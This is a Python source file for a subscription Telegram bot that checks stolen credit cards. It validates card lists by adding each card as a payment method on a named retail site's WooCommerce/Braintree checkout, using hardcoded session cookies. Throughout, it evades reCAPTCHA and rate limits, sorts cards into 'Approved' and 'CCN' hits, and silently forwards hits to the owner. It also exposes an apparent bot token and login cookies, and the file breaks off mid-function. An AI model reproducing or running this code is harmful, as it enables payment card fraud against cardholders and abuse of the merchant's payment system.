import asyncio
import logging
import random
import string
import time
import uuid
from datetime import datetime, timedelta, timezone
import base64
import re
import aiohttp
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)
import json
from pathlib import Path

# =================================================================================
# --- Configuration ---
# =================================================================================

# --- Bot Configuration ---
# 1. Get your Bot Token from BotFather on Telegram
# 2. Get your numeric Telegram User ID from a bot like @userinfobot
# 3. Fill them in below
BOT_TOKEN = "7503634626:AAFS9dqR0eoeAlYcID7y0FMsdMgl7lN9yX4"  # <--- IMPORTANT: REPLACE WITH YOUR BOT TOKEN
OWNER_ID = 7675426356  # <--- IMPORTANT: REPLACE WITH YOUR TELEGRAM USER ID

# --- Checker Configuration ---
CHECKING_LIMITS = {"Gold": 500, "Platinum": 1000, "Owner": 3000}
CONCURRENT_REQUESTS = 3  # Number of cards to check at the same time
TIMEOUT_SECONDS = 70  # Timeout for web requests
COOKIE_REFRESH_INTERVAL = 3600  # 1 hour
WEBSITE_URL = "https://www.woolroots.com"
WEBSITE_PLACEHOLDER = "[Website]"
BOT_NAME = "B33" # You can change your bot's name here for display

# --- Cooldown Configuration ---
COOLDOWN_SECONDS = 20  # Cooldown between requests to the website to avoid bans
LAST_REQUEST_TIME = 0
REQUEST_LOCK = asyncio.Lock()

# --- Logging Configuration ---
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# =================================================================================
# --- JSON Database Setup ---
# =================================================================================

# --- File Paths & Locks ---
DATA_DIR = Path("bot_data")
USERS_FILE = DATA_DIR / "users.json"
KEYS_FILE = DATA_DIR / "keys.json"
COOKIES_FILE = DATA_DIR / "cookies.json"

# --- Locks for Asynchronous File Access ---
USERS_LOCK = asyncio.Lock()
KEYS_LOCK = asyncio.Lock()
COOKIES_LOCK = asyncio.Lock()

# --- Global In-Memory Data ---
SESSION_COOKIES = {}
TASK_REGISTRY = {} # Tracks running file-checking tasks

# --- Helper Functions for JSON I/O ---
async def setup_data_files():
    """Ensures the data directory and initial empty JSON files exist."""
    DATA_DIR.mkdir(exist_ok=True)
    async with USERS_LOCK:
        if not USERS_FILE.exists():
            with open(USERS_FILE, "w") as f:
                json.dump({}, f)
    async with KEYS_LOCK:
        if not KEYS_FILE.exists():
            with open(KEYS_FILE, "w") as f:
                json.dump({}, f)
    async with COOKIES_LOCK:
        if not COOKIES_FILE.exists():
            with open(COOKIES_FILE, "w") as f:
                json.dump({}, f)

async def load_json_data(filepath: Path, lock: asyncio.Lock) -> dict:
    """Safely loads data from a JSON file."""
    async with lock:
        if not filepath.exists():
            return {}
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                return json.load(f)
        except (json.JSONDecodeError, FileNotFoundError):
            return {}

async def save_json_data(filepath: Path, data: dict, lock: asyncio.Lock):
    """Safely saves data to a JSON file."""
    async with lock:
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)

# =================================================================================
# --- Cookie Management ---
# =================================================================================

# --- Card type mapping ---
CARD_TYPE_MAP = {
    "VISA": "visa", "MASTERCARD": "mastercard", "AMEX": "amex",
    "DISCOVER": "discover", "Unknown": "visa"
}

async def load_cookies() -> dict:
    """Loads session cookies from cookies.json."""
    cookies = await load_json_data(COOKIES_FILE, COOKIES_LOCK)
    if cookies:
        return cookies
    # Default cookies if the file is empty or doesn't exist
    return {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-06-24%2016%3A30%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2025-06-24%2016%3A30%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Macintosh%3B%20Intel%20Mac%20OS%20X%2010_15_7%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Safari%2F537.36%20Edg%2F137.0.0.0',
        'PHPSESSID': 'i6tedahgh612vafvbkbi6l8sne',
        '_lscache_vary': '3bd3b5fb94aa2fbc2bfac3d9be19d32b',
        'wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221': 'Err0r%7C1751994134%7ChmZ83X0EkO3FytEV31VpgfMzdtP4cn1gcH4B6o8VVQl%7C2ccb982f4a7c5a759eaaca8e28b0142b5eb0e25342b7406e7eda927413e4d40b',
        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F'
    }

async def save_cookies():
    """Saves the current session cookies to cookies.json."""
    await save_json_data(COOKIES_FILE, SESSION_COOKIES, COOKIES_LOCK)
    logger.info("Cookies saved to JSON file")

async def refresh_cookies(context: ContextTypes.DEFAULT_TYPE = None):
    """Periodically refreshes cookies to keep the session alive."""
    global SESSION_COOKIES
    async with REQUEST_LOCK: # Use the main request lock to avoid conflicts
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                    "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
                }
                async with session.get(f"{WEBSITE_URL}/my-account/", headers=headers, allow_redirects=True) as response:
                    response_text = await response.text()
                    if "g-recaptcha" in response_text or "I'm not a robot" in response_text or "Log in" in response_text:
                        logger.warning("Cookies expired or invalid. Manual update required.")
                        if context:
                            await context.bot.send_message(
                                chat_id=OWNER_ID,
                                text=f"Cookies expired. Please log in to {WEBSITE_PLACEHOLDER}/my-account/, copy PHPSESSID and wordpress_logged_in cookie values, and use /updatecookies."
                            )
                        return False

                    new_cookies = {}
                    for cookie in response.headers.getall("Set-Cookie", []):
                        if "PHPSESSID=" in cookie:
                            new_cookies["PHPSESSID"] = cookie.split("PHPSESSID=")[1].split(";")[0]
                        elif "wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=" in cookie:
                            new_cookies["wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221"] = cookie.split("wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=")[1].split(";")[0]

                    if new_cookies:
                        SESSION_COOKIES.update(new_cookies)
                        await save_cookies()
                        logger.info(f"Refreshed cookies: {list(new_cookies.keys())}")
                        if context:
                            await context.bot.send_message(
                                chat_id=OWNER_ID,
                                text=f"Cookies auto-refreshed: {list(new_cookies.keys())}"
                            )
                        return True
                    else:
                        logger.info("Cookies still valid, no refresh needed.")
                        return True
        except Exception as e:
            logger.error(f"Cookie refresh failed: {e}")
            if context:
                await context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=f"Cookie refresh failed: {e}. A manual update with /updatecookies may be required."
                )
            return False

async def update_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner command to manually update session cookies."""
    global SESSION_COOKIES
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized: This command is for the owner only.")
        return

    if len(context.args) != 2:
        await update.message.reply_text(
            f"Usage: /updatecookies <PHPSESSID_value> <wordpress_logged_in_cookie_value>\n"
            f"Log in to {WEBSITE_URL}/my-account/ and copy the cookie *values* from your browser's developer tools."
        )
        return

    phpsessid_value = context.args[0]
    wordpress_cookie_value = context.args[1]
    wordpress_cookie_name = "wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221"

    new_cookies = {
        "PHPSESSID": phpsessid_value,
        wordpress_cookie_name: wordpress_cookie_value
    }
    SESSION_COOKIES.update(new_cookies)
    await save_cookies()
    await update.message.reply_text("✅ Cookies updated successfully!")
    logger.info("Cookies manually updated by owner.")


# =================================================================================
# --- Core Checker Logic ---
# =================================================================================

async def get_bin_info(bin_number: str) -> dict:
    """Fetches credit card BIN information."""
    default_info = {
        "brand": "Unknown", "level": "Unknown", "type": "Unknown",
        "bank": "Unknown", "country_name": "Unknown", "country_flag": ""
    }
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status != 200:
                    logger.warning(f"BIN lookup failed for {bin_number}: Status {response.status}")
                    return default_info
                data = await response.json()
                return {
                    "brand": data.get("brand", "Unknown").upper(),
                    "level": data.get("level", "Unknown"),
                    "type": data.get("type", "Unknown"),
                    "bank": data.get("bank", "Unknown"),
                    "country_name": data.get("country_name", "Unknown"),
                    "country_flag": data.get("country_flag", "")
                }
    except Exception as e:
        logger.error(f"BIN lookup failed for {bin_number}: {e}")
        return default_info

async def check_cc(cx: str, user_id: int, tier: str, context: ContextTypes.DEFAULT_TYPE) -> dict:
    """The main function to perform a credit card check against the website."""
    global LAST_REQUEST_TIME

    # Enforce cooldown period to prevent being blocked
    async with REQUEST_LOCK:
        elapsed = time.time() - LAST_REQUEST_TIME
        if elapsed < COOLDOWN_SECONDS:
            wait_time = COOLDOWN_SECONDS - elapsed
            logger.info(f"Waiting {wait_time:.2f}s for cooldown.")
            await asyncio.sleep(wait_time)
        LAST_REQUEST_TIME = time.time()

    start_time = time.time()
    try:
        parts = cx.split("|")
        if len(parts) != 4:
            return {"status": "Error", "card": cx, "error": "Invalid CC format"}
        cc, mes, ano, cvv = parts
        ano_exp = ano if len(ano) == 4 else f"20{ano}"
        if not (cc.isdigit() and len(cc) >= 15 and len(cc) <= 16 and mes.isdigit() and len(mes) >= 1 and len(mes) <=2 and cvv.isdigit() and len(cvv) >= 3 and len(cvv) <=4 and ano_exp.isdigit() and len(ano_exp) == 4):
            return {"status": "Error", "card": cx, "error": "Invalid CC data"}

        bin_info = await get_bin_info(cc[:6])

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=TIMEOUT_SECONDS)) as session:
            # Step 1: Get client_token_nonce
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                "Cookie": "; ".join([f"{k}={v}" for k, v in SESSION_COOKIES.items()]),
            }
            async with session.get(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers) as response:
                response_text = await response.text()
                if "g-recaptcha" in response_text or "I'm not a robot" in response_text:
                    logger.warning("reCAPTCHA detected during check.")
                    await context.bot.send_message(OWNER_ID, f"reCAPTCHA detected. Use /updatecookies.")
                    return {"status": "Error", "card": cx, "error": "reCAPTCHA detected"}

                nonce_match = re.search(r'"client_token_nonce":"(.*?)"', response_text)
                if not nonce_match:
                    logger.error("Could not find client_token_nonce.")
                    return {"status": "Error", "card": cx, "error": "Nonce extraction failed (Step 1)"}
                client_token_nonce = nonce_match.group(1)

            # Step 2: Get Braintree authorizationFingerprint
            ajax_headers = headers | {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": WEBSITE_URL,
                "Referer": f"{WEBSITE_URL}/my-account/add-payment-method/",
                "X-Requested-With": "XMLHttpRequest",
            }
            data = {"action": "wc_braintree_credit_card_get_client_token", "nonce": client_token_nonce}
            async with session.post(f"{WEBSITE_URL}/wp-admin/admin-ajax.php", headers=ajax_headers, data=data) as response:
                response_text = await response.text()
                token_match = re.search(r'"data":"(.*?)"', response_text)
                if not token_match:
                    logger.error("Could not find token data.")
                    return {"status": "Error", "card": cx, "error": "Token data extraction failed (Step 2)"}

                decoded_token = base64.b64decode(token_match.group(1)).decode()
                auth_match = re.search(r'"authorizationFingerprint":"(.*?)"', decoded_token)
                if not auth_match:
                    logger.error("Could not find authorizationFingerprint.")
                    return {"status": "Error", "card": cx, "error": "Auth fingerprint extraction failed (Step 2)"}
                auth_fingerprint = auth_match.group(1)

            # Step 3: Tokenize the card with Braintree
            braintree_headers = {
                "Authorization": f"Bearer {auth_fingerprint}",
                "Braintree-Version": "2018-05-10",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            }
            braintree_payload = {
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }",
                "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mes, "expirationYear": ano_exp, "cvv": cvv}, "options": {"validate": True}}},
                "operationName": "TokenizeCreditCard",
            }
            async with session.post("https://payments.braintree-api.com/graphql", headers=braintree_headers, json=braintree_payload) as response:
                result = await response.json()
                payment_nonce = result.get("data", {}).get("tokenizeCreditCard", {}).get("token")
                if not payment_nonce:
                    error_message = result.get('errors', [{}])[0].get('message', 'Unknown Braintree error')
                    logger.error(f"Braintree tokenization failed: {error_message}")
                    return {"status": "Declined ❌", "card": cx, "result": {"message": error_message, "original_message": error_message, "time_taken": time.time() - start_time, **bin_info}}

            # Step 4: Get the final woocommerce-add-payment-method-nonce
            async with session.get(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers) as response:
                response_text = await response.text()
                pay_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response_text)
                if not pay_nonce_match:
                    logger.error("Could not find woocommerce payment nonce.")
                    return {"status": "Error", "card": cx, "error": "Final payment nonce failed (Step 4)"}
                final_pay_nonce = pay_nonce_match.group(1)

            # Step 5: Submit the payment method to the website
            final_data = {
                "payment_method": "braintree_credit_card",
                "wc-braintree-credit-card-card-type": CARD_TYPE_MAP.get(bin_info["brand"], "visa"),
                "wc_braintree_credit_card_payment_nonce": payment_nonce,
                "wc_braintree_device_data": f'{{"correlation_id":"{str(uuid.uuid4())}"}}',
                "wc-braintree-credit-card-tokenize-payment-method": "true",
                "woocommerce-add-payment-method-nonce": final_pay_nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1"
            }
            async with session.post(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=ajax_headers, data=final_data) as response:
                response_text = await response.text()
                soup = BeautifulSoup(response_text, "html.parser")
                message_elem = soup.find(class_=re.compile("woocommerce-(message|error|notice)"))
                msg = message_elem.text.strip() if message_elem else "Unknown server response."

                status = "Declined ❌"
                if "new payment method added" in msg.lower() or "successfully added" in msg.lower():
                    status = "Approved ✅"
                elif "insufficient funds" in msg.lower():
                    status = "Approved ✅" # Treat as a live card
                elif "duplicate card exists" in msg.lower():
                    status = "Approved ✅" # Treat as a live card
                elif "cvv" in msg.lower() and "declined" in msg.lower():
                    status = "CCN ✅" # CCN Live

                return {
                    "status": status,
                    "card": cx,
                    "result": {
                        "message": msg,
                        "original_message": msg,
                        "time_taken": time.time() - start_time,
                        **bin_info
                    }
                }

    except Exception as e:
        logger.error(f"Critical error checking CC {cx[:6]}...: {e}", exc_info=True)
        return {"status": "Error", "card": cx, "error": str(e)}

# =================================================================================
# --- Telegram Command Handlers ---
# =================================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /start command."""
    keyboard = [
        [InlineKeyboardButton("❓ Help", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"🔥 Welcome to {BOT_NAME} Checker!\n"
        f"🔹 Use /chk to check a single CC.\n"
        f"🔹 Send a .txt file to check multiple CCs.\n"
        f"🔹 Use /redeem to activate a subscription key.",
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles all button presses from inline keyboards."""
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "stop_check":
        if user_id in TASK_REGISTRY:
            await TASK_REGISTRY[user_id].stop()
            await query.edit_message_text("⏹️ Checking process stopped by user.")
        else:
            await query.edit_message_text("No active checking process to stop.")

    elif query.data == "help":
        await query.message.reply_text(
            f"""<b>--- Help Menu ---</b>

<b>User Commands:</b>
/start - Start the bot
/chk <code>CC|MM|YY|CVV</code> - Check a single card.
/redeem <code>key</code> - Redeem a premium key.
/stop - Stop your current file checking process.
<i>(You can also send a .txt file directly to check cards in bulk)</i>

<b>Owner Commands:</b>
/genkey <code>tier days qty</code> - Generate keys (e.g., /genkey Gold 7 10)
/delkey <code>user_id</code> - Delete a user's subscription.
/updatecookies <code>sessid wp_cookie</code> - Manually update cookies.
/broadcast <code>message</code> - Send a message to all users.
/stats - View bot usage statistics.
""",
            parse_mode="HTML"
        )

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles single credit card checks via the /chk command."""
    user_id = update.effective_user.id
    all_users = await load_json_data(USERS_FILE, USERS_LOCK)
    user_str_id = str(user_id)

    user = all_users.get(user_str_id)
    if user_id != OWNER_ID and (not user or datetime.fromisoformat(user["expiration"]) < datetime.now(timezone.utc)):
        await update.message.reply_text("You need an active subscription. Use /redeem <key> to activate.")
        return

    tier = "Owner" if user_id == OWNER_ID else user.get("tier", "N/A")

    if not context.args:
        await update.message.reply_text("Usage: /chk [card_details]")
        return

    # --- MODIFIED SECTION START ---
    raw_text = " ".join(context.args)
    cc_data = None

    # Regex to find different card formats
    patterns = [
        r"(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})",    # CC|MM|YY|CVV
        r"(\d{15,16})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})",  # CC|MM/YY|CVV
        r"(\d{15,16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})", # CC MM YY CVV
    ]

    for pattern in patterns:
        match = re.search(pattern, raw_text)
        if match:
            cc, mes, ano, cvv = match.groups()
            # Normalize the year to 2 digits (e.g., 2025 -> 25)
            if len(ano) == 4:
                ano = ano[-2:]
            # Reconstruct the card string into the standard format
            cc_data = f"{cc}|{mes}|{ano}|{cvv}"
            break # Exit loop once a match is found

    if not cc_data:
        await update.message.reply_text(
            "Invalid card format. Please use one of the supported formats:\n"
            "- `CC|MM|YY|CVV`\n- `CC|MM/YY|CVV`\n- `CC MM YY CVV`"
        )
        return
    # --- MODIFIED SECTION END ---

    checking_msg = await update.message.reply_text("⏳ Checking CC... Please wait.")
    result = await check_cc(cc_data, user_id, tier, context)
    await checking_msg.delete()

    if result["status"] == "Error":
        await update.message.reply_text(f"Error: {result['error']}")
        return

    res_data = result["result"]
    response_text = (
        f"<b>{result['status']}</b>\n"
        f"<b>Card:</b> <code>{result['card']}</code>\n"
        f"<b>Response:</b> {res_data['message']}\n"
        f"<b>Gateway:</b> Braintree Auth\n"
        f"<b>----------------------------------------</b>\n"
        f"<b>Info:</b> {res_data['brand']} - {res_data['type']} - {res_data['level']}\n"
        f"<b>Bank:</b> {res_data['bank']}\n"
        f"<b>Country:</b> {res_data['country_name']} {res_data['country_flag']}\n"
        f"<b>----------------------------------------</b>\n"
        f"<b>Time:</b> {res_data['time_taken']:.2f}s\n"
        f"<b>Checked By:</b> <a href='tg://user?id={user_id}'>{update.effective_user.first_name}</a> ({tier})\n"
        f"<b>Bot:</b> @{(await context.bot.get_me()).username}"
    )
    await update.message.reply_text(response_text, parse_mode="HTML", disable_web_page_preview=True)

    if result['status'] in ["Approved ✅", "CCN ✅"]:
        # Forward hits to owner
        await context.bot.send_message(OWNER_ID, f"<b>HIT FORWARDED</b>\n\n{response_text}", parse_mode="HTML", disable_web_page_preview=True)


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stops the current file checking task for the user."""
    user_id = update.effective_user.id
    if user_id in TASK_REGISTRY:
        task = TASK_REGISTRY[user_id]
        await task.stop()
        await update.message.reply_text("⏹️ Checking process has been stopped.")
        # The task will clean itself up from the registry
    else:
        await update.message.reply_text("You have no active checking process to stop.")

# =================================================================================
# --- File-Based (Bulk) Checker ---
# =================================================================================

class CheckerTask:
    """Manages the state and execution of a bulk checking task."""
    def __init__(self, user_id, cards, tier, context, update):
        self.user_id = user_id
        self.cards = cards
        self.tier = tier
        self.context = context
        self.update = update
        self.queue = asyncio.Queue()
        self.stopped = False
        self.progress = {
            "total": len(cards), "approved": 0, "declined": 0, "ccn": 0, "checked": 0,
            "start_time": time.time(), "last_response": "Starting..."
        }
        self.hits = []
        self.progress_message = None
        self.main_task = None
        self.progress_updater_task = None

    async def start(self):
        """Initializes and starts the checking process."""
        for card in self.cards:
            await self.queue.put(card)

        initial_text = self.get_progress_text()
        keyboard = [[InlineKeyboardButton("⏹️ Stop Checking", callback_data="stop_check")]]
        self.progress_message = await self.update.message.reply_text(
            initial_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML"
        )

        self.main_task = asyncio.create_task(self.run())

    def get_progress_text(self):
        """Generates the text for the progress message."""
        p = self.progress
        elapsed_time = time.time() - p['start_time']

        # Simple progress bar
        percentage = (p['checked'] / p['total']) * 100 if p['total'] > 0 else 0
        bar_filled = int(percentage // 10)
        bar = '✅' * bar_filled + '⬜️' * (10 - bar_filled)

        return (
            f"<b>🔥 Checking in Progress...</b>\n"
            f"{bar} {p['checked']}/{p['total']} ({percentage:.2f}%)\n\n"
            f"<b>Approved:</b> {p['approved']} ✅\n"
            f"<b>CCN:</b> {p['ccn']} ✅\n"
            f"<b>Declined:</b> {p['declined']} ❌\n"
            f"<b>Elapsed:</b> {int(elapsed_time)}s\n\n"
            f"<i>Last Response: {p['last_response']}</i>"
        )

    async def update_progress_display(self):
        """Periodically updates the progress message on Telegram."""
        while not self.stopped and self.progress['checked'] < self.progress['total']:
            try:
                text = self.get_progress_text()
                keyboard = [[InlineKeyboardButton("⏹️ Stop Checking", callback_data="stop_check")]]
                await self.context.bot.edit_message_text(
                    chat_id=self.update.message.chat_id,
                    message_id=self.progress_message.message_id,
                    text=text,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"Failed to update progress message: {e}")
            await asyncio.sleep(5) # Update every 5 seconds

    async def worker(self):
        """A single worker that pulls cards from the queue and checks them."""
        while not self.stopped:
            try:
                card = self.queue.get_nowait()
                result = await check_cc(card, self.user_id, self.tier, self.context)

                # Update progress counters
                self.progress['checked'] += 1
                status = result.get("status", "Error")
                self.progress['last_response'] = result.get("result", {}).get("message", "N/A")

                if status == "Approved ✅":
                    self.progress['approved'] += 1
                    self.hits.append(card)
                elif status == "CCN ✅":
                    self.progress['ccn'] += 1
                    self.hits.append(card)
                elif status == "Declined ❌":
                    self.progress['declined'] += 1

                self.queue.task_done()
            except asyncio.QueueEmpty:
                break # Queue is empty, worker is done
            except Exception as e:
                logger.error(f"Error in worker: {e}")

    async def run(self):
        """Runs the workers and manages the overall task lifecycle."""
        self.progress_updater_task = asyncio.create_task(self.update_progress_display())
        workers = [asyncio.create_task(self.worker()) for _ in range(CONCURRENT_REQUESTS)]

        await asyncio.gather(*workers, return_exceptions=True)
        await self.finalize()

    async def stop(self):
        """Stops the checking task."""
        self.stopped = True
        if self.main_task: self.main_task.cancel()
        if self.progress_updater_task: self.progress_updater_task.cancel()

    async def finalize(self):
        """Called when the checking is complete or stopped."""
        if self.progress_updater_task:
            self.progress_updater_task.cancel()

        total_time = time.time() - self.progress["start_time"]

        final_summary = (
            f"<b>🏁 Check Complete!</b>\n\n"
            f"<b>Total Cards:</b> {self.progress['total']}\n"
            f"<b>Checked:</b> {self.progress['checked']}\n"
            f"<b>- Approved:</b> {self.progress['approved']}\n"
            f"<b>- CCN:</b> {self.progress['ccn']}\n"
            f"<b>- Declined:</b> {self.progress['declined']}\n"
            f"<b>Time Taken:</b> {total_time:.2f} seconds"
        )
        await self.context.bot.edit_message_text(
            chat_id=self.update.message.chat_id,
            message_id=self.progress_message.message_id,
            text=final_summary,
            parse_mode="HTML"
        )

        if self.hits:
            hits_filename = f"hits_{self.user_id}_{int(time.time())}.txt"
            with open(hits_filename, "w") as f:
                f.write("\n".join(self.hits))

            await self.update.message.reply_document(
                document=open(hits_filename, "rb"),
                filename=hits_filename,
                caption="🎉 Here are your hits!"
            )
            Path(hits_filename).unlink() # Clean up the file

        if self.user_id in TASK_REGISTRY:
            del TASK_REGISTRY[self.user_id]


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles uploaded .txt files for bulk checking."""
    user_id = update.effective_user.id
    if user_id in TASK_REGISTRY:
        await update.message.reply_text("You already have a check in progress. Use /stop to cancel it first.")
        return

    all_users = await load_json_data(USERS_FILE, USERS_LOCK)
    user_str_id = str(user_id)
    user = all_users.get(user_str_id)

    if user_id != OWNER_ID and (not user or datetime.fromisoformat(user["expiration"]) < datetime.now(timezone.utc)):
        await update.message.reply_text("You need an active subscription. Use /redeem <key> to activate.")
        return

    tier = "Owner" if user_id == OWNER_ID else user.get("tier", "N/A")
    limit = CHECKING_LIMITS.get(tier, 50) # Default limit of 50

    if not update.message.document or not update.message.document.file_name.endswith(".txt"):
        await update.message.reply_text("Please upload a valid .txt file.")
        return

    try:
        file = await update.message.document.get_file()
        file_content = await file.download_as_bytearray()
        raw_text = file_content.decode("utf-8")

        # Define regex patterns to find card details
        # Pattern 1: Finds formats like 5132...|04|25|352
        # Pattern 2: Finds formats like 5132...|04/25|352
        patterns = [
            r"(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})",
            r"(\d{15,16})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})",
        ]

        cards = []
        found_cards = set()  # Use a set to store found CC numbers to prevent duplicates

        for pattern in patterns:
            matches = re.findall(pattern, raw_text)
            for match in matches:
                # Unpack the matched groups
                cc, mes, ano, cvv = match[0], match[1], match[2], match[3]

                # Avoid adding duplicate credit cards
                if cc in found_cards:
                    continue

                # Normalize the year to 2 digits (e.g., 2025 -> 25)
                if len(ano) == 4:
                    ano = ano[-2:]

                # Reconstruct the card string into the standard format
                card_string = f"{cc}|{mes}|{ano}|{cvv}"
                cards.append(card_string)
                found_cards.add(cc)

        if not cards:
            await update.message.reply_text("No valid CCs found in the file. Supported formats:\n- `CC|MM|YY|CVV`\n- `CC|MM/YY|CVV`")
            return

        if len(cards) > limit:
            await update.message.reply_text(f"Your tier ({tier}) allows up to {limit} cards. The list will be truncated.")
            cards = cards[:limit]

        task = CheckerTask(user_id, cards, tier, context, update)
        TASK_REGISTRY[user_id] = task
        await task.start()

    except UnicodeDecodeError:
        await update.message.reply_text("Error decoding file. Please ensure it is UTF-8 encoded.")
    except Exception as e:
        await update.message.reply_text(f"An unexpected error occurred: {e}")
        logger.error(f"Error handling file for user {user_id}: {e}", exc_info=True)


# =================================================================================
# --- Owner & Subscription Commands ---
# =================================================================================

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner command to generate subscription keys."""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return

    try:
        tier, duration_str, quantity_str = context.args
        if tier not in CHECKING_LIMITS:
            await update.message.reply_text(f"Invalid tier. Available: {', '.join(CHECKING_LIMITS.keys())}")
            return
        duration = int(duration_str.replace('d', ''))
        quantity = int(quantity_str)
    except (ValueError, IndexError):
        await update.message.reply_text("Usage: /genkey <Tier> <Duration>d <Quantity>\nExample: /genkey Gold 30d 5")
        return

    all_keys = await load_json_data(KEYS_FILE, KEYS_LOCK)
    generated_keys = []
    for _ in range(quantity):
        key = f"{BOT_NAME.upper()}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
        all_keys[key] = {"tier": tier, "duration_days": duration, "used": False}
        generated_keys.append(f"`{key}`")

    await save_json_data(KEYS_FILE, all_keys, KEYS_LOCK)

    response = (
        f"✅ Generated {quantity} key(s) for {tier} tier ({duration} days):\n\n" +
        "\n".join(generated_keys)
    )
    await update.message.reply_text(response, parse_mode="Markdown")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Allows a user to redeem a subscription key."""
    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: /redeem <key>")
        return

    key_to_redeem = context.args[0]
    all_keys = await load_json_data(KEYS_FILE, KEYS_LOCK)

    if key_to_redeem not in all_keys or all_keys[key_to_redeem]["used"]:
        await update.message.reply_text("❌ Invalid or already used key.")
        return

    key_data = all_keys[key_to_redeem]
    duration = timedelta(days=key_data["duration_days"])
    expiration_date = datetime.now(timezone.utc) + duration

    all_users = await load_json_data(USERS_FILE, USERS_LOCK)
    user_id = str(update.effective_user.id)
    all_users[user_id] = {
        "tier": key_data["tier"],
        "expiration": expiration_date.isoformat() # Store as ISO string
    }

    all_keys[key_to_redeem]["used"] = True
